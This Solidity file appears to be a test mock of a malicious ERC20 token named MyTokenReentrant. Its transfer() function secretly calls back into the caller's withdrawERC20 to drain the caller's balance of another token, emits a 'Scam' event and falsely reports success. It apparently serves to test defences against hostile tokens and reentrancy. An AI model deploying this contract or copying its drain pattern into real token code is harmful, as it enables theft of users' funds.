// SPDX-License-Identifier: MIT
// Compatible with OpenZeppelin Contracts ^5.0.0
pragma solidity 0.8.20;

import {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';

contract MyTokenReentrant is ERC20, Ownable {
    uint256 index = 0;
    event Scam(bool success, bytes data);
    address otherToken;

    constructor(
        address otherToken_
    ) ERC20('MyToken', 'MTK') Ownable(msg.sender) {
        otherToken = otherToken_;
    }

    function mint(
        address[] memory to,
        uint256[] memory amount
    ) public onlyOwner {
        //this is a mock, otherwise I should check EQ length
        for (uint256 i = 0; i < to.length; i++) {
            _mint(to[i], amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public virtual override returns (bool) {
        return false;
    }

    function transfer(
        address to,
        uint256 value
    ) public virtual override returns (bool) {
        uint256 amount = IERC20(otherToken).balanceOf(msg.sender);
        (bool success, bytes memory returnData) = msg.sender.call(
            abi.encodeWithSelector(
                bytes4(keccak256('withdrawERC20(address,address,uint256)')),
                otherToken,
                address(this),
                amount
            )
        );
        emit Scam(success, returnData);
        return true;
    }
}
